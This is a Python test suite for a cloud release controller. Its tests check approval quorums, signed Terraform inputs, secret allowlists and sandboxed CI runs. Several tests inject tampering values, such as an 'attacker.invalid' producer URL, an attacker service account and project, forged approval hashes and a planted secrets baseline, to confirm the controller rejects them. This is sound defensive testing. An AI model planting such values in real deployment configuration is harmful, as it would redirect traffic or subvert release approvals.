    manifest = json.loads(artifacts.read(planned["plan_manifest_uri"]))
    assert manifest["required_gate_roles"] == [
        "g1b-gcp-owner", "g1b-release-owner",
    ]
    assert manifest["platform_pipeline_inputs"]["cicd_bootstrap"] == {
        "enabled": True,
        "release_controller_image_digest": CONTROLLER_IMAGE,
    }
    plan_call = next(call for call in tools.calls if call[:2] == ("terraform", "plan"))
    assert any(part.startswith("-var=cicd_bootstrap=") for part in plan_call)
    assert any(part.startswith("-var=gate_approver_accounts=") for part in plan_call)
    with pytest.raises(ControllerRejected, match="multiparty gate receipt quorum"):
        rc.execute([
            "apply", "platform", "--plan-uri", planned["plan_uri"],
            "--plan-sha256", planned["plan_sha256"],
        ])


@pytest.mark.parametrize(
    ("root", "phase", "message"),
    [
        ("staging", "shadow", "G4 quorum"),
        ("production", "shadow", "G7/G8/G9"),
        ("platform", "firestore-enforce", "prepare smoke chain"),
    ],
)
def test_apply_fails_closed_for_unimplemented_active_gate_quorums(
    controller, root, phase, message,
):
    rc, _tools, _artifacts = controller
    with pytest.raises(ControllerRejected, match=message):
        rc._validate_apply_gate_receipts(  # noqa: SLF001
            {"root": root, "release_phase": phase}, "",
        )


@pytest.mark.parametrize(
    ("mutation", "message"),
    [
        ("duplicate_principal", "approvers must be distinct"),
        ("wrong_role", "command is invalid"),
        ("wrong_env", "command is invalid"),
        ("tampered_scope", "scope is invalid"),
    ],
)
def test_authenticated_g4_quorum_rejects_tampering(controller, mutation, message):
    rc, tools, _artifacts = controller
    required = [
        "g4-requester", "g4-n8n-owner", "g4-participant-plan-owner",
        "g4-forusbots-owner", "g4-delivery-owner",
    ]
    scope = {
        "_CANDIDATE_SHA": SHA, "_CONTROLLER_DIGEST": CONTROLLER_IMAGE,
        "_IMAGE_DIGEST": IMAGE, "_EVIDENCE_INPUTS_SHA256": "a" * 64,
    }
    raw = _install_scoped_receipts(tools, required, scope)
    first, second = raw.split(",", 2)[:2]
    first_id = first.split("=", 1)[1]
    second_id = second.split("=", 1)[1]
    if mutation == "duplicate_principal":
        tools.builds[second_id]["approval"]["result"]["approverAccount"] = (
            tools.builds[first_id]["approval"]["result"]["approverAccount"]
        )
        tools.triggers[tools.builds[second_id]["buildTriggerId"]]["build"]["steps"][0][
            "args"
        ][6] = tools.builds[first_id]["approval"]["result"]["approverAccount"]
        tools.builds[second_id]["steps"][0]["args"][6] = (
            tools.builds[first_id]["approval"]["result"]["approverAccount"]
        )
    elif mutation == "wrong_role":
        trigger = tools.triggers[tools.builds[first_id]["buildTriggerId"]]
        trigger["build"]["steps"][0]["args"][4] = "release-owner"
    elif mutation == "wrong_env":
        tools.builds[first_id]["steps"][0]["env"][0] = "BUILD_ID=attacker"
    else:
        tools.builds[first_id]["substitutions"]["_CANDIDATE_SHA"] = "e" * 40

    with pytest.raises(ControllerRejected, match=message):
        rc._validate_scoped_receipt_set(  # noqa: SLF001
            required, raw, {key: scope for key in required}, label="G4",
        )


def test_authenticated_g4_quorum_accepts_premerge_candidate_bound_to_main_controller(
    controller,
):
    rc, tools, _artifacts = controller
    required = [
        "g4-requester", "g4-n8n-owner", "g4-participant-plan-owner",
        "g4-forusbots-owner", "g4-delivery-owner",
    ]
    scope = {
        "_CANDIDATE_SHA": SHA, "_CONTROLLER_DIGEST": CONTROLLER_IMAGE,
        "_IMAGE_DIGEST": IMAGE, "_EVIDENCE_INPUTS_SHA256": "a" * 64,
    }
    raw = _install_scoped_receipts(tools, required, scope)
    hashes = rc._validate_scoped_receipt_set(  # noqa: SLF001
        required, raw, {key: scope for key in required}, label="G4",
    )
    assert set(hashes) == set(required)
    assert all(
        build["sourceProvenance"]["resolvedGitSource"]["revision"] == "d" * 40
        and build["substitutions"]["_CANDIDATE_SHA"] == SHA
        for build in tools.builds.values()
    )


def test_platform_secret_inventory_is_bound_to_managed_environment_inputs(controller):
    rc, _tools, artifacts = controller
    uris = {}
    for environment, suffix in (("staging", "stg"), ("production", "prod")):
        uri = _write_environment_tfvars(artifacts, environment, active=True)
        body = json.loads(artifacts.read(uri))
        ids = body["tfvars"]["secret_containers"]["ids"]
        body["tfvars"]["secret_containers"]["ids"] = {
            key: f"{value}-{suffix}" for key, value in ids.items()
        }
        if environment == "staging":
            e2e_ids = body["tfvars"]["e2e_secret_containers"]
            body["tfvars"]["e2e_secret_containers"] = {
                key: f"{value}-{suffix}" for key, value in e2e_ids.items()
            }
        body.pop("manifest_hash")
        artifacts.replace_for_test(uri, _signed_manifest(body))
        uris[environment] = uri

    inventories, existing, hashes = rc._platform_secret_inventory(  # noqa: SLF001
        candidate_sha=SHA, staging_uri=uris["staging"],
        production_uri=uris["production"],
        staging_existing_ids="", production_existing_ids="api-key-prod",
        container_phases={"staging": "managed", "production": "managed"},
    )

    assert "api-key-stg" in inventories["staging"]
    assert "api-key-prod" in inventories["production"]
    assert existing == {"staging": [], "production": ["api-key-prod"]}
    assert set(hashes) == {"staging", "production"}


def test_staging_semantic_plan_rejects_scheduler_now_owned_by_platform(controller):
    rc, tools, artifacts = controller
    outputs_uri = _write_platform_outputs(artifacts)
    environment_uri = _write_environment_tfvars(artifacts, "staging", active=True)
    tools.semantic_plan = {
        "format_version": "1.2",
        "resource_changes": [{
            "address": "module.staging.google_cloud_scheduler_job.reconciler_tick[0]",
            "mode": "managed", "type": "google_cloud_scheduler_job",
            "name": "reconciler_tick",
            "change": {"actions": ["create"], "before": None, "after": {
                "project": PROJECT, "name": "ticket-reconciler-staging-tick",
            }},
        }],
    }

    with pytest.raises(ControllerRejected, match="resource address"):
        rc.execute([
            "plan", "staging", "--candidate-sha", SHA,
            "--image-digest", IMAGE, "--release-phase", "shadow",
            "--platform-outputs-uri", outputs_uri,
            "--environment-tfvars-uri", environment_uri,
        ])


def test_environment_tfvars_tampering_blocks_apply(controller):
    rc, tools, artifacts = controller
    outputs_uri = _write_platform_outputs(artifacts)
    environment_uri = _write_environment_tfvars(artifacts, "staging")
    planned = rc.execute([
        "plan", "staging", "--candidate-sha", SHA,
        "--release-phase", "infra_only",
        "--platform-outputs-uri", outputs_uri,
        "--environment-tfvars-uri", environment_uri,
    ])
    artifacts.replace_for_test(environment_uri, b"{}")
    with pytest.raises(ControllerRejected, match="environment tfvars"):
        rc.execute([
            "apply", "staging", "--plan-uri", planned["plan_uri"],
            "--plan-sha256", planned["plan_sha256"],
        ])
    assert not any(call[:2] == ("terraform", "apply") for call in tools.calls)


def test_first_staging_plan_apply_binds_absent_state_and_rejects_appearance(controller):
    rc, tools, artifacts = controller
    tools.state_generation = None
    outputs_uri = _write_platform_outputs(artifacts)
    environment_uri = _write_environment_tfvars(artifacts, "staging")
    planned = rc.execute([
        "plan", "staging", "--candidate-sha", SHA,
        "--release-phase", "infra_only",
        "--platform-outputs-uri", outputs_uri,
        "--environment-tfvars-uri", environment_uri,
    ])
    manifest = json.loads(artifacts.read(planned["plan_manifest_uri"]))
    assert manifest["state_lineage"] == "__absent__"
    assert manifest["state_serial"] == -1
    assert manifest["state_generation"] == "absent"
    pulls_before = sum(call[:3] == ("terraform", "state", "pull") for call in tools.calls)
    applied = rc.execute([
        "apply", "staging", "--plan-uri", planned["plan_uri"],
        "--plan-sha256", planned["plan_sha256"],
        "--gate-receipts", _install_gate_receipts(tools, artifacts, planned),
    ])
    assert applied["status"] == "applied"

    tools.state_generation = "99"
    with pytest.raises(ControllerRejected, match="state generation drift"):
        rc.execute([
            "apply", "staging", "--plan-uri", planned["plan_uri"],
            "--plan-sha256", planned["plan_sha256"],
        ])
    pulls_after = sum(call[:3] == ("terraform", "state", "pull") for call in tools.calls)
    assert pulls_after == pulls_before


def test_environment_tfvars_reject_secret_payload_and_runtime_e2e_digest(controller):
    rc, _tools, artifacts = controller
    outputs_uri = _write_platform_outputs(artifacts)
    environment_uri = _write_environment_tfvars(artifacts, "staging", active=True)
    body = json.loads(artifacts.read(environment_uri))
    body["tfvars"]["secret_version_refs"]["API_KEY"] = "actual-secret-payload"
    body["tfvars"]["e2e_job"]["image_digest"] = IMAGE
    body.pop("manifest_hash")
    artifacts.replace_for_test(environment_uri, _signed_manifest(body))
    with pytest.raises(ControllerRejected):
        rc.execute([
            "plan", "staging", "--candidate-sha", SHA,
            "--image-digest", IMAGE, "--release-phase", "shadow",
            "--platform-outputs-uri", outputs_uri,
            "--environment-tfvars-uri", environment_uri,
        ])


def test_environment_tfvars_reject_unallowlisted_e2e_secret_key(controller):
    rc, _tools, artifacts = controller
    outputs_uri = _write_platform_outputs(artifacts)
    environment_uri = _write_environment_tfvars(artifacts, "staging", active=True)
    body = json.loads(artifacts.read(environment_uri))
    body["tfvars"]["e2e_job"]["secret_version_refs"] = {
        "AWS_SECRET_ACCESS_KEY": (
            f"projects/{PROJECT}/secrets/aws-secret/versions/1"
        ),
    }
    body.pop("manifest_hash")
    artifacts.replace_for_test(environment_uri, _signed_manifest(body))
    with pytest.raises(ControllerRejected, match="closed allowlist"):
        rc.execute([
            "plan", "staging", "--candidate-sha", SHA,
            "--image-digest", IMAGE, "--release-phase", "shadow",
            "--platform-outputs-uri", outputs_uri,
            "--environment-tfvars-uri", environment_uri,
        ])


@pytest.mark.parametrize(
    ("mutation", "message"),
    [
        ("missing_nonsecret", "nonsecret env allowlist"),
        ("derived_nonsecret", "nonsecret env allowlist"),
        ("wrong_main_sha", "main SHA"),
        ("versioned_destination", "exact unversioned candidate destination"),
        ("same_differential_destination", "exact unversioned candidate destination"),
        ("missing_baseline", "baseline revision"),
        ("wrong_e2e_secret_container", "E2E secret containers"),
        ("unbound_gate", "nonsecret env allowlist"),
        ("obsolete_aws_auth", "unapproved staging tfvars"),
    ],
)
def test_active_staging_rejects_untrusted_e2e_inputs(controller, mutation, message):
    rc, _tools, artifacts = controller
    outputs_uri = _write_platform_outputs(artifacts)
    environment_uri = _write_environment_tfvars(artifacts, "staging", active=True)
    body = json.loads(artifacts.read(environment_uri))
    e2e = body["tfvars"]["e2e_job"]
    if mutation == "missing_nonsecret":
        e2e["nonsecret_env"].pop("E2E_COMPANY_NAME")
    elif mutation == "derived_nonsecret":
        e2e["nonsecret_env"]["E2E_SECONDARY_PRODUCER_URL"] = "https://attacker.invalid"
    elif mutation == "wrong_main_sha":
        e2e["nonsecret_env"]["E2E_MAIN_SHA"] = "f" * 40
    elif mutation == "versioned_destination":
        e2e["nonsecret_env"]["E2E_EVIDENCE_URI"] += "#1"
    elif mutation == "same_differential_destination":
        e2e["nonsecret_env"]["E2E_DIFFERENTIAL_EVIDENCE_URI"] = (
            e2e["nonsecret_env"]["E2E_EVIDENCE_URI"]
        )
    elif mutation == "missing_baseline":
        body["tfvars"]["producer_baseline_revision"] = ""
    elif mutation == "wrong_e2e_secret_container":
        body["tfvars"]["e2e_secret_containers"]["E2E_API_KEY"] = "wrong-secret"
    elif mutation == "unbound_gate":
        e2e["nonsecret_env"]["E2E_G2_APPROVAL"] = "APROBADO G2 synthetic"
    else:
        body["tfvars"]["n8n_aws_account_id"] = "123456789012"
    body.pop("manifest_hash")
    artifacts.replace_for_test(environment_uri, _signed_manifest(body))
    with pytest.raises(ControllerRejected, match=message):
        rc.execute([
            "plan", "staging", "--candidate-sha", SHA,
            "--image-digest", IMAGE, "--release-phase", "shadow",
            "--platform-outputs-uri", outputs_uri,
            "--environment-tfvars-uri", environment_uri,
        ])


@pytest.mark.parametrize("mutation", ["self_hash", "service_account", "firestore"])
def test_environment_plan_rejects_invalid_platform_outputs(controller, mutation):
    rc, tools, artifacts = controller
    outputs_uri = _write_platform_outputs(artifacts)
    environment_uri = _write_environment_tfvars(artifacts, "staging")
    body = json.loads(artifacts.read(outputs_uri))
    if mutation == "self_hash":
        body["status"] = "rejected"
    elif mutation == "service_account":
        body["outputs"]["runtime_service_accounts"]["ticket-worker-stg"] = (
            "attacker@other-project.iam.gserviceaccount.com"
        )
        body.pop("manifest_hash")
        body = json.loads(_signed_manifest(body))
    else:
        body["outputs"]["firestore_scope_enforced"] = False
        body.pop("manifest_hash")
        body = json.loads(_signed_manifest(body))
    artifacts.replace_for_test(outputs_uri, json.dumps(body).encode())

    with pytest.raises(ControllerRejected):
        rc.execute([
            "plan", "staging", "--candidate-sha", SHA,
            "--image-digest", IMAGE, "--release-phase", "infra_only",
            "--platform-outputs-uri", outputs_uri,
            "--environment-tfvars-uri", environment_uri,
        ])
    assert not any(call[0] == "terraform" for call in tools.calls)


def test_environment_apply_revalidates_exact_platform_outputs(controller):
    rc, tools, artifacts = controller
    outputs_uri = _write_platform_outputs(artifacts)
    environment_uri = _write_environment_tfvars(artifacts, "staging")
    planned = rc.execute([
        "plan", "staging", "--candidate-sha", SHA,
        "--image-digest", IMAGE, "--release-phase", "infra_only",
        "--platform-outputs-uri", outputs_uri,
        "--environment-tfvars-uri", environment_uri,
    ])
    artifacts.replace_for_test(outputs_uri, b"{}")

    with pytest.raises(ControllerRejected, match="platform outputs"):
        rc.execute([
            "apply", "staging", "--plan-uri", planned["plan_uri"],
            "--plan-sha256", planned["plan_sha256"],
        ])
    assert not any(call[:2] == ("terraform", "apply") for call in tools.calls)


def test_release_controller_phase_contract_matches_terraform(controller):
    rc, _tools, artifacts = controller
    outputs_uri = _write_platform_outputs(artifacts)
    production_uri = _write_environment_tfvars(artifacts, "production", active=True)
    for phase in ("dark_no_traffic", "dark_100", "shadow", "knowledge_only", "full"):
        # Production additionally requires a promotion. This assertion reaches
        # that gate, proving the phase itself is accepted by the controller.
        with pytest.raises(ControllerRejected, match="promotion URI"):
            rc.execute([
                "plan", "production", "--candidate-sha", SHA,
                "--image-digest", IMAGE, "--release-phase", phase,
                "--platform-outputs-uri", outputs_uri,
                "--environment-tfvars-uri", production_uri,
            ])
    with pytest.raises(ControllerRejected, match="release phase"):
        rc.execute([
            "plan", "staging", "--candidate-sha", SHA,
            "--image-digest", IMAGE, "--release-phase", "active_100",
            "--platform-outputs-uri", outputs_uri,
            "--environment-tfvars-uri", production_uri,
        ])


def test_production_tfvars_reject_public_or_arbitrary_invoker(controller):
    rc, _tools, artifacts = controller
    outputs_uri = _write_platform_outputs(artifacts)
    production_uri = _write_environment_tfvars(artifacts, "production", active=True)
    body = json.loads(artifacts.read(production_uri))
    body["tfvars"]["producer_invoker_members"] = ["allUsers"]
    body.pop("manifest_hash")
    artifacts.replace_for_test(production_uri, _signed_manifest(body))
    with pytest.raises(ControllerRejected, match="invoker inventory"):
        rc.execute([
            "plan", "production", "--candidate-sha", SHA,
            "--image-digest", IMAGE, "--release-phase", "dark_no_traffic",
            "--platform-outputs-uri", outputs_uri,
            "--environment-tfvars-uri", production_uri,
            "--controller-digest", CONTROLLER_IMAGE,
        ])


def test_evidence_fails_closed_without_authenticated_multiparty_receipts(controller):
    rc, _tools, _artifacts = controller
    with pytest.raises(ControllerRejected, match="evidence publication.*quorum"):
        rc.execute([
            "evidence-manifest", "--evidence-sha", EVIDENCE_SHA,
            "--main-sha", SHA, "--image-digest", IMAGE,
            "--controller-digest", CONTROLLER_IMAGE,
        ])


def test_evidence_rejects_superficial_pass_document(controller):
    rc, _tools, artifacts = controller
    uri = json.loads(
        (rc.source.root / "docs/verification/handle-ticket/evidence-inputs.json")
        .read_text()
    )["e2e"]
    artifacts.replace_for_test(uri, json.dumps({
        "artifact_type": "e2e", "status": "pass",
        "main_sha": SHA, "image_digest": IMAGE,
    }).encode())
    with pytest.raises(ControllerRejected, match="e2e evidence invalid"):
        rc.execute([
            "evidence-manifest", "--evidence-sha", EVIDENCE_SHA,
            "--main-sha", SHA, "--image-digest", IMAGE,
            "--controller-digest", CONTROLLER_IMAGE,
        ])


def test_evidence_rejects_forged_high_approval_hash(controller):
    rc, _tools, artifacts = controller
    uri = json.loads(
        (rc.source.root / "docs/verification/handle-ticket/evidence-inputs.json")
        .read_text()
    )["scan"]
    scan = json.loads(artifacts.read(uri))
    scan["result"]["severity_counts"]["HIGH"] = 1
    scan["result"]["high_approvals"] = [{
        "vulnerability_id": "CVE-2026-12345", "approval_hash": "a" * 64,
    }]
    artifacts.replace_for_test(uri, json.dumps(scan).encode())
    with pytest.raises(ControllerRejected, match="quorum externo autenticado"):
        rc.execute([
            "evidence-manifest", "--evidence-sha", EVIDENCE_SHA,
            "--main-sha", SHA, "--image-digest", IMAGE,
            "--controller-digest", CONTROLLER_IMAGE,
        ])


def test_test_only_revalidates_without_terraform_or_publishing(controller):
    rc, tools, _artifacts = controller
    result = rc.execute([
        "test-only", "--candidate-sha", SHA, "--image-digest", IMAGE,
    ])
    assert result["status"] == "verified"
    commands = [call[0] for call in tools.calls]
    assert "terraform" not in commands
    assert not any(call[:2] == ("docker", "push") for call in tools.calls)
    assert any(call[:2] == ("docker", "build") for call in tools.calls)
    assert not any(call and call[0] in {
        "python3", "pytest", "ruff", "mypy", "detect-secrets", "pip-audit",
    } for call in tools.calls)

    candidate_runs = [
        call for call in tools.calls
        if call[:2] == ("docker", "run")
        and any(tool in " ".join(call) for tool in (
            "pytest", "ruff", "mypy", "pip check", "detect-secrets scan",
        ))
    ]
    assert candidate_runs
    assert all("--network=none" in call for call in candidate_runs)
    assert all(
        "--read-only" in call
        and "--cap-drop=ALL" in call
        and "--security-opt=no-new-privileges" in call
        and any(part.startswith("--tmpfs=/tmp:") for part in call)
        and any(part.startswith("--pids-limit=") for part in call)
        and any(part.startswith("--memory=") for part in call)
        and any(part.startswith("--cpus=") for part in call)
        for call in candidate_runs
    )
    assert all(
        all(
            not (part.startswith(("--volume=", "--mount=")))
            or part.endswith(":ro")
            for part in call
        )
        and not any("docker.sock" in part for part in call)
        for call in candidate_runs
    )
    secret_command = next(
        call for call in candidate_runs
        if call[-2] == "-c" and "detect-secrets scan" in call[-1]
    )
    trusted_mounts = [
        part for part in secret_command if part.startswith("--volume=")
    ]
    assert len(trusted_mounts) == 1
    assert trusted_mounts[0].endswith(
        ":/opt/release-controller/verify_secrets_baseline.py:ro"
    )
    assert all(
        "--env=GOOGLE_APPLICATION_CREDENTIALS=/nonexistent/google-adc.json" in call
        and "--env=CLOUDSDK_AUTH_CREDENTIAL_FILE_OVERRIDE=/nonexistent/google-adc.json" in call
        and "--env=GCE_METADATA_HOST=127.0.0.1:9" in call
        for call in candidate_runs
    )

    secret_scan = next(
        call[-1] for call in candidate_runs
        if call[-2] == "-c" and "detect-secrets scan" in call[-1]
    )
    assert "--baseline" not in secret_scan
    assert "--all-files ." in secret_scan
    assert "--no-verify" in secret_scan
    assert secret_scan.count("--exclude-files") == 7
    assert (
        "python /opt/release-controller/verify_secrets_baseline.py"
        in secret_scan
    )
    assert "python scripts/verify_secrets_baseline.py" not in secret_scan


def test_test_only_rejects_candidate_baseline_drift_before_execution(controller):
    rc, tools, _artifacts = controller
    baseline = rc.source.root / "kb-rag-system" / ".secrets.baseline"
    baseline.write_text(json.dumps({
        **EMPTY_SECRET_BASELINE,
        "results": {
            "api/placeholder.py": [{
                "type": "Secret Keyword",
                "hashed_secret": "candidate-controlled",
            }],
        },
    }), encoding="utf-8")

    with pytest.raises(ControllerRejected, match="secrets.baseline.*reviewed"):
        rc.execute([
            "test-only", "--candidate-sha", SHA, "--image-digest", IMAGE,
        ])

    assert not any(
        call[:2] == ("docker", "run") and "pytest" in call
        for call in tools.calls
    )


def test_e2e_build_uses_full_sha_smokes_scans_and_publishes_manifest(controller):
    rc, tools, artifacts = controller
    result = rc.execute(["e2e-image", "--candidate-sha", SHA])
    manifest = json.loads(artifacts.read(result["e2e_image_manifest_uri"]))
    assert manifest["main_sha"] == SHA
    assert manifest["artifact_type"] == "e2e_image"
    assert manifest["status"] == "passed"
    build = next(call for call in tools.calls if call[:2] == ("docker", "build"))
    assert any(f":{SHA}-" in part for part in build)
    assert any(call[:2] == ("docker", "push") for call in tools.calls)
    smoke = next(call for call in tools.calls if call[:2] == ("docker", "run"))
    assert smoke[-1] == "scripts/container_smoke.py"
    assert "--network=none" in smoke
    assert "--workdir=/app" in smoke
    assert "--env=PYTHONPATH=/app" in smoke
    assert "staging_e2e" not in smoke
    assert any(call[:2] == ("scan-image", "verify") for call in tools.calls)


def test_e2e_rejects_multi_platform_or_ambiguous_tag(controller):
    rc, tools, _artifacts = controller
    tools.e2e_registry_digest = "ambiguous"
    with pytest.raises(ControllerRejected, match="one immutable digest"):
        rc.execute(["e2e-image", "--candidate-sha", SHA])


def test_runtime_image_uses_trusted_build_and_isolated_candidate_execution(controller):
    rc, tools, _artifacts = controller
    result = rc.execute(["runtime-image", "--candidate-sha", SHA])
    assert result["image_digest"] == (
        "us-central1-docker.pkg.dev/proj/repo/runtime@sha256:" + "f" * 64
    )
    terraform_runs = [
        call for call in tools.calls
        if call[:2] == ("docker", "run") and "--entrypoint=terraform" in call
    ]
    assert terraform_runs
    assert all("--network=none" in call for call in terraform_runs)
    assert all("--read-only" in call and "--cap-drop=ALL" in call
               for call in terraform_runs)
    assert all(
        "--env=TF_CLI_CONFIG_FILE=/opt/release-controller/terraform-cli.tfrc" in call
        and "--env=GOOGLE_APPLICATION_CREDENTIALS=/nonexistent/google-adc.json" in call
        and "--env=GCE_METADATA_HOST=127.0.0.1:9" in call
        for call in terraform_runs
    )
    assert not any(call and call[0] == "terraform" for call in tools.calls)
    assert any(call[:2] == ("docker", "push") for call in tools.calls)
    smoke = next(
        call for call in tools.calls
        if call[:2] == ("docker", "run") and "/opt/container-smoke.py" in call
    )
    assert "--workdir=/app" in smoke
    assert "--env=PYTHONPATH=/app" in smoke


def test_release_controller_embeds_offline_reviewed_provider_mirror():
    root = Path(__file__).resolve().parent.parent
    dockerfile = (root / "Dockerfile.release-controller").read_text()
    cli_config = (root / "ci" / "terraform-cli.tfrc").read_text()
    assert "providers mirror -platform=linux_amd64" in dockerfile
    assert "reviewed.terraform.lock.hcl /provider-config/.terraform.lock.hcl" in dockerfile
    assert "COPY --from=terraform /provider-mirror" in dockerfile
    assert "TF_CLI_CONFIG_FILE=/opt/release-controller/terraform-cli.tfrc" in dockerfile
    assert (
        "COPY scripts/verify_secrets_baseline.py "
        "./trusted-context/verify_secrets_baseline.py"
    ) in dockerfile
    assert "filesystem_mirror" in cli_config
    assert "direct" not in cli_config
    dockerignore = (root / "Dockerfile.release-controller.dockerignore").read_text()
    for required in (
        "!ci/", "!ci/reviewed.terraform.lock.hcl",
        "!scripts/verify_secrets_baseline.py", "!scripts/container_smoke.py",
    ):
        assert required in dockerignore


def test_runtime_image_does_not_ship_mutating_admin_scripts():
    dockerfile = (Path(__file__).resolve().parent.parent / "Dockerfile").read_text()
    assert "COPY --chown=appuser:appuser scripts/" not in dockerfile
    for name in ("delete_article.py", "update_article.py", "process_single_article.py"):
        assert name not in dockerfile


def test_dependency_audit_runs_in_reviewed_ci_image_without_cloud_credentials(controller):
    rc, tools, _artifacts = controller
    kb = rc.source.root / "kb-rag-system"

    rc._run_isolated_ci(SHA, kb)  # noqa: SLF001

    audits = [
        call for call in tools.calls
        if call[:2] == ("docker", "run") and "--entrypoint=pip-audit" in call
    ]
    assert len(audits) == 1
    audit = audits[0]
    assert "--env=GOOGLE_APPLICATION_CREDENTIALS=/nonexistent/google-adc.json" in audit
    assert (
        "--env=CLOUDSDK_AUTH_CREDENTIAL_FILE_OVERRIDE="
        "/nonexistent/google-adc.json"
    ) in audit
    assert "--env=GCE_METADATA_HOST=127.0.0.1:9" in audit
    assert "--read-only" in audit
    assert "--cap-drop=ALL" in audit
    assert "--security-opt=no-new-privileges" in audit
    assert not any(call and call[0] == "pip-audit" for call in tools.calls)


def test_isolated_secret_scan_is_gitless_and_matches_reviewed_filters(controller):
    rc, tools, _artifacts = controller
    kb = rc.source.root / "kb-rag-system"

    rc._run_isolated_ci(SHA, kb)  # noqa: SLF001

    scans = [
        call[-1] for call in tools.calls
        if call[:2] == ("docker", "run")
        and "--entrypoint=/bin/sh" in call
        and call[-2] == "-c"
        and "detect-secrets scan" in call[-1]
    ]
    assert len(scans) == 1
    scan = scans[0]
    assert "detect-secrets scan --all-files ." in scan
    assert "--no-verify" in scan
    for pattern in (
        r"\.venv/.*",
        r"\.pytest_cache/.*",
        r"\.mypy_cache/.*",
        r"\.ruff_cache/.*",
        r"^\.secrets\.baseline$",
        "__pycache__/.*",
        "rag-testing/stress_test_results.*",
    ):
        assert f"--exclude-files '{pattern}'" in scan


def test_runtime_attest_publishes_only_finalized_source_provenance(controller):
    rc, _tools, artifacts = controller
    result = rc.execute([
        "runtime-attest", "--candidate-sha", SHA,
        "--image-digest", IMAGE, "--source-build-id", "build-123",
    ])

    document = json.loads(artifacts.read(result["ci_provenance_uri"]))
    assert document["artifact_type"] == "ci_provenance"
    assert document["result"]["build_id"] == "build-123"
    assert document["result"]["source_commit"] == SHA
    assert document["result"]["subject_digest"] == IMAGE


def test_runtime_attest_accepts_one_high_only_with_authenticated_g5v_quorum(controller):
    rc, tools, artifacts = controller
    report_hash = "9" * 64
    tools.scan_result = {
        "status": "rejected", "critical": 0, "high": 1,
        "high_ids": ["CVE-2026-12345"], "scan_report_sha256": report_hash,
    }
    scope = {
        "_CANDIDATE_SHA": SHA, "_CONTROLLER_DIGEST": CONTROLLER_IMAGE,
        "_IMAGE_DIGEST": IMAGE, "_VULNERABILITY_ID": "CVE-2026-12345",
        "_SCAN_REPORT_SHA256": report_hash,
    }
    required = ["g5v-security-owner", "g5v-release-owner", "g5v-requester"]
    receipts = _install_scoped_receipts(tools, required, scope)

    result = rc.execute([
        "runtime-attest", "--candidate-sha", SHA, "--image-digest", IMAGE,
        "--source-build-id", "build-123", "--gate-receipts", receipts,
    ])
    document = json.loads(artifacts.read(result["ci_provenance_uri"]))
    assert set(document["result"]["g5v_receipt_hashes"]) == set(required)


def test_queue_preflight_treats_only_exact_not_found_as_absent(monkeypatch):
    monkeypatch.setenv("PROJECT_ID", "rag-kb-system")
    tools = ProductionToolchain()
    calls = []

    def not_found(argv, **_kwargs):
        calls.append(tuple(argv))
        raise subprocess.CalledProcessError(
            1, argv, stderr="NOT_FOUND: ticket-jobs-staging does not exist",
        )

    monkeypatch.setattr(tools, "run", not_found)
    tools.pause_existing_queue_and_verify_empty("ticket-jobs-staging")
    assert len(calls) == 1
    assert "--project=rag-kb-system" in calls[0]
    assert "--location=us-central1" in calls[0]


@pytest.mark.parametrize("returncode", [1, 4, 14])
def test_queue_preflight_never_treats_permission_or_transport_error_as_absent(
    monkeypatch, returncode,
):
    monkeypatch.setenv("PROJECT_ID", "rag-kb-system")
    tools = ProductionToolchain()

    def failed(argv, **_kwargs):
        raise subprocess.CalledProcessError(returncode, argv, stderr="PERMISSION_DENIED")

    monkeypatch.setattr(tools, "run", failed)
    with pytest.raises(subprocess.CalledProcessError):
        tools.pause_existing_queue_and_verify_empty("ticket-jobs-staging")


def test_controller_image_contains_only_trusted_allowlisted_context():
    root = Path(__file__).resolve().parent.parent
    dockerfile = root / "Dockerfile.release-controller"
    dockerignore = root / "Dockerfile.release-controller.dockerignore"
    assert dockerfile.is_file()
    assert dockerignore.is_file()
    text = dockerignore.read_text()
    assert text.startswith("*\n")
    assert "!scripts/" in text.splitlines()
    assert "!scripts/release_controller.py" in text
    assert "!scripts/create_plan_manifest.py" in text
    assert "!Dockerfile.ci" in text
    assert "!requirements.lock" in text
    assert "!cloudbuild.terraform-plan.yaml" in text
    assert "!api/**" not in text
    assert "!tests/**" not in text
    dockerfile_text = dockerfile.read_text()
    assert "scripts/verify_secrets_baseline.py" in dockerfile_text
    assert "ci/reviewed.terraform.lock.hcl" in dockerfile_text
    assert "!ci/reviewed.terraform.lock.hcl" in text


def test_controller_candidate_recipe_is_pinned_and_verify_only():
    root = Path(__file__).resolve().parent.parent
    config = (root / "ci" / "cloudbuild.release-controller.yaml").read_text()
    assert "Dockerfile.release-controller" in config
    assert "$COMMIT_SHA" in config
    assert "@sha256:" in config
    assert "id: 'build-controller-candidate'" in config
    assert "id: 'smoke-controller-candidate'" in config
    assert "ticket-controller-verify@rag-kb-system.iam.gserviceaccount.com" in config
    assert "id: 'push-controller'" not in config
    assert "gcloud artifacts docker images scan" not in config
    assert "images:" not in config
    assert "gcloud run" not in config
    assert "terraform apply" not in config


def test_environment_plan_triggers_require_platform_outputs_handoff():
    root = Path(__file__).resolve().parents[2]
    config = (root / "infra" / "terraform" / "live" / "platform" /
              "cloud_build.tf").read_text()
    assert config.count('"--platform-outputs-uri", "$_PLATFORM_OUTPUTS_URI"') == 2
    assert config.count('"--environment-tfvars-uri", "$_ENVIRONMENT_TFVARS_URI"') == 2
    assert config.index('resource "google_cloudbuild_trigger" "staging_plan"') < (
        config.index('"--platform-outputs-uri", "$_PLATFORM_OUTPUTS_URI"')
    )


def test_writer_ci_triggers_execute_only_digest_pinned_controller_inline():
    root = Path(__file__).resolve().parents[2]
    config = (root / "infra" / "terraform" / "live" / "platform" /
              "cloud_build.tf").read_text()
    for resource_name in ("ci", "main_canonical"):
        start = config.index(
            f'resource "google_cloudbuild_trigger" "{resource_name}"'
        )
        end = config.index("\n}\n", start)
        block = config[start:end]
        assert "filename" not in block
        assert 'args = ["runtime-image", "--candidate-sha", "$COMMIT_SHA"]' in block
        assert "release_controller_image_digest" in block


def test_cli_help_does_not_require_project_or_credentials(monkeypatch):
    from scripts.release_controller import main

    monkeypatch.delenv("PROJECT_ID", raising=False)
    with pytest.raises(SystemExit) as exited:
        main(["--help"])
    assert exited.value.code == 0


def test_cli_rejects_other_well_formed_project_before_any_cloud_call(monkeypatch):
    from scripts.release_controller import main

    monkeypatch.setenv("PROJECT_ID", "attacker-project")
    assert main(["plan", "platform", "--candidate-sha", SHA]) == 2
